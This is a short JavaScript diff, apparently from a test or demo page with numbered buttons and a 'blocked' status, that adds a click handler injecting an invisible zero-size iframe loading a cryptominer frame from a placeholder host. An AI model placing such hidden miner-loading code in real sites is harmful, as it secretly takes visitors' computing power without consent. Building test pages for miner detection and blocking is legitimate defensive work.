@@ -38,3 +38,15 @@ document.getElementById('btn2').addEventListener('click', () => {
       statusEl.className = 'status blocked';
     });
 });
+
+document.getElementById("btn3").addEventListener("click", () => {
+  const iframe = document.createElement("iframe");
+  iframe.src = "https://example.com/minerframe.html"; // <-- Replace with actual path to your miner frame
+  iframe.style.width = "0";
+  iframe.style.height = "0";
+  iframe.style.border = "none";
+  iframe.style.display = "none";
+
+  document.body.appendChild(iframe);
+  document.getElementById("result3").classList.remove("hidden");
+});
